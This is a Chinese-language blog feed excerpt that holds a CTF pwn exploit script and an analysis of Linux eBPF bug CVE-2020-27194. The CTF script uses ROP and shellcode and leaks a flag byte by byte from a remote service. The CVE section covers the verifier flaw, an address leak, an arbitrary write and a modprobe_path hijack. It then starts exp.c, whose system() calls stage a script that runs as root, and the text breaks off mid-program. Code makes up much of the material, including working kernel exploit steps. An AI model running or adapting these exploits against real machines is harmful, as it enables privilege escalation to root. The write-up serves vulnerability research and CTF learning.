<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><p>代码写的有点差。。目前只能人工看阻塞情况，之后ctrl+c打印目标字节，再手动修改偏移得到下一字节。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./dark'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'121.41.41.111'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#num_letter = "0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">bak = <span class="string">'&#123;&#125;_'</span>+string.ascii_lowercase + string.digits</span><br><span class="line">elf = ELF(<span class="string">'./dark'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040127b</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401279</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000401016</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4011ef</span></span><br><span class="line">csu_end_addr = <span class="number">0x401272</span></span><br><span class="line">csu_start_addr = <span class="number">0x401258</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx,rbp,r12,r13,r14,r15,fake_ebp,last)</span>:</span></span><br><span class="line">    <span class="comment">#r13d=edi</span></span><br><span class="line">    <span class="comment">#r14=rsi</span></span><br><span class="line">    <span class="comment">#r15=rdx</span></span><br><span class="line">    <span class="comment">#rbx = 0</span></span><br><span class="line">    <span class="comment">#r12 = call_func</span></span><br><span class="line">    payload = p64(csu_end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_start_addr)</span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(fake_ebp)</span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">print</span> len(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment">#0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(char,dis)</span>:</span></span><br><span class="line">    read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    alarm_got = elf.got[<span class="string">'alarm'</span>]</span><br><span class="line">    bss_addr = <span class="number">0x00404050</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span>+p64(bss_addr)</span><br><span class="line">    payload += p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(read_plt)+p64(leave_ret)</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x40127c')</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = p64(bss_addr+<span class="number">0x88</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,alarm_got,<span class="number">0x1</span>,bss_addr+<span class="number">0x88</span>,leave_ret)</span><br><span class="line">    <span class="comment">#mprotect(0x404000,0x1000,7)</span></span><br><span class="line">    <span class="comment">#set rax</span></span><br><span class="line">    payload += p64(bss_addr+<span class="number">0x88</span>+<span class="number">0x88</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_addr+<span class="number">0x400</span>,<span class="number">0xa</span>,bss_addr+<span class="number">0x88</span>*<span class="number">2</span>,leave_ret)</span><br><span class="line">    <span class="comment">#syscall</span></span><br><span class="line">    payload += p64(bss_addr+<span class="number">0x88</span>*<span class="number">3</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,alarm_got,bss_addr<span class="number">-0x50</span>,<span class="number">0x1000</span>,<span class="number">7</span>,bss_addr+<span class="number">0x88</span>*<span class="number">3</span>,leave_ret)</span><br><span class="line">    <span class="comment">#open('')</span></span><br><span class="line">    payload += p64(bss_addr+<span class="number">0x88</span>*<span class="number">4</span>)+p64(ret_addr)+p64(bss_addr+<span class="number">0x88</span>*<span class="number">3</span>+<span class="number">0x18</span>)</span><br><span class="line">    payload += asm(shellcraft.amd64.linux.open(<span class="string">'./flag\x00'</span>))</span><br><span class="line">    payload += asm(shellcraft.amd64.linux.read(<span class="number">3</span>,bss_addr+<span class="number">0x410</span>,<span class="number">0x30</span>))</span><br><span class="line">    <span class="comment">#buf=&gt;0x404460</span></span><br><span class="line">    flag_addr = <span class="number">0x404460</span></span><br><span class="line">    sc = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    push 0x404560</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x100</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push 0x404460</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    <span class="comment">#char = '1'</span></span><br><span class="line">    sc += asm(<span class="string">'mov rbx,[rcx+'</span>+str(dis)+<span class="string">']'</span>)</span><br><span class="line">    sc += asm(<span class="string">'cmp bl,'</span>+hex(ord(char)))</span><br><span class="line">    sc += <span class="string">'\x74\x08'</span></span><br><span class="line">    sc += <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">    sc += asm(<span class="string">'mov rax,0;syscall'</span>)</span><br><span class="line">    payload += sc</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    write_sc = asm(shellcraft.amd64.linux.write(1,bss_addr+0x410-5,0x30))</span></span><br><span class="line"><span class="string">    #payload += p64(0x01be5a306a5f016a)+p64(0x414561f681010101)+"\x01"</span></span><br><span class="line"><span class="string">    #payload += asm("push 1;")</span></span><br><span class="line"><span class="string">    #payload += asm("pop edi;")</span></span><br><span class="line"><span class="string">    payload += asm("mov edi,1")</span></span><br><span class="line"><span class="string">    #payload += asm("push 0x30")</span></span><br><span class="line"><span class="string">    #payload += asm("pop edx")</span></span><br><span class="line"><span class="string">    payload += asm("mov edx,0x30")</span></span><br><span class="line"><span class="string">    payload += asm("mov esi,0x1010101")</span></span><br><span class="line"><span class="string">    payload += asm("xor esi,0x1414564")</span></span><br><span class="line"><span class="string">    payload += asm("push 0x40000001")</span></span><br><span class="line"><span class="string">    payload += asm("pop rax")</span></span><br><span class="line"><span class="string">    payload += asm("syscall")</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#payload += asm("push 0x40000001;pop rax;syscall")</span></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="comment">#stack migratation</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="comment">#partial overwrite</span></span><br><span class="line">    p.send(<span class="string">'\x45'</span>)</span><br><span class="line">    <span class="comment">#set rax=0xa</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.sendline(<span class="string">'a'</span>*<span class="number">9</span>)</span><br><span class="line">    <span class="comment">#payload += p64()</span></span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">dis = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_exit</span><span class="params">(signum,frame)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> str(dis+<span class="number">1</span>)+<span class="string">" char is "</span> + bak[count]</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    signal.signal(signal.SIGINT,my_exit)</span><br><span class="line">    total = len(bak)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp(bak[count],dis)</span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"recv:"</span>+p.recvline()</span><br><span class="line">        <span class="keyword">print</span> bak[count]</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./dark'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">        p = remote(<span class="string">'121.41.41.111'</span>,<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>云安全CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2020-27194</title>
    <url>/2020/12/14/CVE-2020-27194/</url>
    <content><![CDATA[<h1 id="CVE-2020-27194-ebpf提权漏洞分析及利用"><a href="#CVE-2020-27194-ebpf提权漏洞分析及利用" class="headerlink" title="CVE-2020-27194-ebpf提权漏洞分析及利用"></a>CVE-2020-27194-ebpf提权漏洞分析及利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到玄武公众号推了篇博文，是一位大佬发的bpf的fuzz分享和通过这个fuzz挖到的CVE-2020-27194<a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/]" target="_blank" rel="noopener">fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel</a>。大概意思是在用户态模拟出ebpf的verifier来进行fuzz，改进了传统的在内核里fuzz的方式，大大节约了fuzz的时间。其专注于挖逻辑洞，以内存越界读写为判断标准来判定输入数据造成的效果，这个fuzz的思路非常精妙，恰好前几天GEEKPWN遇到了ebpf的题，根据poc可以看到漏洞类型和pwn2own的CVE-2020-8835非常类似，因此花了两天时间来写exp，在写这篇文章的时候已经有几个大佬发布了自己拿到root shell的视频，笔者比较菜，还是拿熟悉的modprobe_path来实现以root权限执行任意命令，后面自己会补一下拿root shell的exp，本文涉及到的文件在<a href="https://github.com/xmzyshypnc/CVE-2020-27194" target="_blank" rel="noopener">这里</a>。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看漏洞patch对应的<a href="https://github.com/torvalds/linux/commit/5b9fbeb75b6a98955f628e205ac26689bcb1383e" target="_blank" rel="noopener">commit</a>，可以看到patch针对<code>scalar32_min_max_or</code>函数，漏洞产生的root cause在于下面的四行赋值，在进行BPF_OR操作时会将64位的smin_value/umin_value赋给32位的smin_val，并且在满足一定条件时将<code>dst_reg-&gt;umin_value/dst_reg-&gt;umax_value</code>赋值给<code>dst-&gt;s32_min_value/dst-&gt;s32_max_value</code>。看过<code>CVE-2020-8835</code>洞的师傅应该知道其漏洞产生的核心也是错用32位函数对64位变量进行操作，在64位数给32位赋值时高位截断，进而造成对输入数据的判断失误，产生越界读写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_or</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> = <span class="title">tnum_subreg</span>(<span class="title">dst_reg</span>-&gt;<span class="title">var_off</span>);</span></span><br><span class="line">	s32 smin_val = src_reg-&gt;smin_value;<span class="comment">//vuln</span></span><br><span class="line">	u32 umin_val = src_reg-&gt;umin_value;<span class="comment">//vuln</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Assuming scalar64_min_max_or will be called so it is safe</span></span><br><span class="line"><span class="comment">	 * to skip updating register for known case.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We get our maximum from the var_off, and our minimum is the</span></span><br><span class="line"><span class="comment">	 * maximum of the operands' minima</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;u32_min_value = max(dst_reg-&gt;u32_min_value, umin_val);</span><br><span class="line">	dst_reg-&gt;u32_max_value = var32_off.value | var32_off.mask;</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">		 * ain't nobody got time for that.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">		dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">		 * cast result into s64.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;<span class="comment">//vuln</span></span><br><span class="line">		dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;<span class="comment">//vuln</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>作者给出了一种典型的漏洞触发方式，首先创建一个map，从map中可以加载值到寄存器中，不妨假设我们将某个可控值加载到r5中，通过<code>BPF_JMP_IMM(BPF_JGT, BPF_REG_5, 0, 1)</code>设置<code>r5&gt;0</code>，通过<code>BPF_LD_IMM64(BPF_REG_6, 0x600000002)</code>和<code>BPF_JMP_REG(BPF_JLT, BPF_REG_5, BPF_REG_6, 1),</code>设置<code>r5&lt;r6=0x600000002</code>，进而让<code>r5-&gt;umin_value=0x1，r5-&gt;umax_value=0x600000001</code>。再让r5和立即数0进行OR运算<code>BPF_ALU64_IMM(BPF_OR, BPF_REG_5, 0),</code>，使得<code>dst_reg-&gt;s32_min_value=dst_reg-&gt;s32_max_value</code>，verifier认为r5的值恒为1，使用<code>BPF_MOV32_REG(BPF_REG_7, BPF_REG_5),</code>将r7赋值为r5即可让r7的值也恒为1，假如我们对r5加载的初始值为2，它首先可以绕过<code>1&lt;r5&lt;0x600000001</code>的检查进行<code>OR</code>运算，之后被verifier认为值为1.我们使用<code>BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 1),</code>对r7进行右移运算，verifier中得到值为0，而实际值为1，这样就产生了检查和实际运行值的不统一，进而可以利用造成越界读写。下面是部分调试的截图。</p>
<p>在进行<code>OR</code>运算前r5寄存器结构体的值。</p>
<p><img src="/2020/12/14/CVE-2020-27194/1.png" alt></p>
<p>在<code>OR</code>运算赋值后更新的r5寄存器结构体。</p>
<p><img src="/2020/12/14/CVE-2020-27194/2.png" alt></p>
<p>在右移运算前的r7寄存器结构体。</p>
<p><img src="/2020/12/14/CVE-2020-27194/3.png" alt></p>
<p>在右移运算后的r7寄存器结构体。</p>
<p><img src="/2020/12/14/CVE-2020-27194/4.png" alt></p>
<h2 id="从PoC到Exp"><a href="#从PoC到Exp" class="headerlink" title="从PoC到Exp"></a>从PoC到Exp</h2><p>走到上面的步骤后其实后面和<code>CVE-2020-8835</code>的漏洞利用都一样了。</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>内核以<code>struct bpf_array</code>结构体管理map，其成员aux-&gt;value表征map的地址，我们使用<code>BPF_ALU64_IMM(BPF_MUL,6,0x110), //r6 *= 0x110</code>得到r6寄存器为0x110，将exp_map的地址存储到r7寄存器后使用<code>BPF_ALU64_REG(BPF_SUB,7,6),     //r7 -= r6</code>让r7指向<code>(struct bpf_array)-&gt;array_map_ops</code>，这是一个位于内核文件中rdata区的数据结构，再通过<code>BPF_LDX_MEM(BPF_DW,0,7,0),</code>将值存储到r0寄存器，进而将这个值存储回map中，由于r6被verifier认为是0，因此r7-0再取值的结果被认为是一个合法的访问，借此我们可以计算出kaslr的值。</p>
<p>结构体偏移为0xc0处存储着<code>wait_list-&gt;next</code>指向自身地址，借此可以泄露出map的地址以及map_element的地址。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写在我上篇文章以及<a href="https://www.anquanke.com/post/id/203416" target="_blank" rel="noopener">CVE-2020-8835 pwn2own 2020 ebpf 提权漏洞分析</a>这篇文章都有详细阐述，我们利用一个利用链<code>bpf_map_update_value-&gt;(map-&gt;ops-&gt;map_push_elem)-&gt;array_map_get_next_key</code>来构造任意地址写4字节。</p>
<h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>原本想尝试上篇文章的prctl提权，但是后面发现poweroff_cmd是一个不可写的地址，当我尝试进行赋值时，内核直接crash掉，之后搜了下发现有<code>__request_module</code>，进而找到<code>modprobe_path</code>来修改，这种思路和前面引用的<code>rtfingc</code>师傅的思路是一样的，原理是内核有一个全局的变量modprobe_path设置当打开错误格式文件时将会执行的命令，我们设置为一个修改flag权限的bash文件路径即可。</p>
<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>这里我分享一下自己编写exp中遇到的坑。在调用完<code>BPF_MAP_GET(0,5)</code>加载ctrl_map[0]到r5之后要清空r0寄存器，即赋值为一个立即数，否则bpf认为可能存在内存泄露的风险。</p>
<p>在漏洞利用时有个条件需要绕过，即<code>dst_reg-&gt;s32_min_value</code>需要大于等于0，初始值为0x80000000。这里我通过<code>BPF_JMP32_IMM(BPF_JLE, 5, 0x7fffffff, 1)</code>来设置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">		 * ain't nobody got time for that.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">		dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">		 * cast result into s64.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;</span><br><span class="line">		dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"linux/bpf.h"</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf_insn.h"</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65535</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MAP_GET(idx, dst)                                                        \</span></span><br><span class="line">	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              <span class="comment">/* r1 = r9                */</span>   \</span><br><span class="line">	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             <span class="comment">/* r2 = fp                */</span>   \</span><br><span class="line">	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),            <span class="comment">/* r2 = fp - 4            */</span>   \</span><br><span class="line">	BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-4</span>, idx),           <span class="comment">/* *(u32 *)(fp - 4) = idx */</span>   \</span><br><span class="line">	BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),             \</span><br><span class="line">	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),            <span class="comment">/* if (r0 == 0)           */</span>   \</span><br><span class="line">	BPF_EXIT_INSN(),                                  <span class="comment">/*   exit(0);             */</span>   \</span><br><span class="line">	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, <span class="number">0</span>)          <span class="comment">/* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MAP_GET_ADDR(idx, dst)                                                        \</span></span><br><span class="line">	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              <span class="comment">/* r1 = r9                */</span>   \</span><br><span class="line">	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             <span class="comment">/* r2 = fp                */</span>   \</span><br><span class="line">	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),            <span class="comment">/* r2 = fp - 4            */</span>   \</span><br><span class="line">	BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-4</span>, idx),           <span class="comment">/* *(u32 *)(fp - 4) = idx */</span>   \</span><br><span class="line">	BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),             \</span><br><span class="line">	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),            <span class="comment">/* if (r0 == 0)           */</span>   \</span><br><span class="line">	BPF_EXIT_INSN(),                                  <span class="comment">/*   exit(0);             */</span>   \</span><br><span class="line">	BPF_MOV64_REG((dst), BPF_REG_0)          	  <span class="comment">/* r_dst = (r0)   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ctrlmapfd, expmapfd;</span><br><span class="line"><span class="keyword">int</span> progfd;</span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_fake_elf</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /my_exp"</span>); </span><br><span class="line">    system(<span class="string">"chmod +x /my_exp"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /fake"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /fake"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    gen_fake_elf();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x64dump</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">uint32_t</span> num)</span></span>&#123;         </span><br><span class="line">    <span class="keyword">uint64_t</span> *buf64 =  (<span class="keyword">uint64_t</span> *)buf;       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-x64dump-] start : \n"</span>);         </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;                   </span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; i!=<span class="number">0</span>)&#123;                   </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);                     </span><br><span class="line">            &#125;                                     </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0x%016lx "</span>,*(buf64+i));       </span><br><span class="line">        &#125;                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[-x64dump-] end ... \n"</span>);       </span><br><span class="line">&#125;                                             </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loglx</span><span class="params">(<span class="keyword">char</span> *tag,<span class="keyword">uint64_t</span> num)</span></span>&#123;         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[lx] "</span>);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" %-20s "</span>,tag);                  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": %-#16lx\n"</span>,num);              </span><br><span class="line">&#125;                                           </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,         </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,  </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span>;      </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,  </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> max_entries)</span></span>;                                                 </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd ,<span class="keyword">void</span> *key, <span class="keyword">void</span> *value,<span class="keyword">uint64_t</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[]=&#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    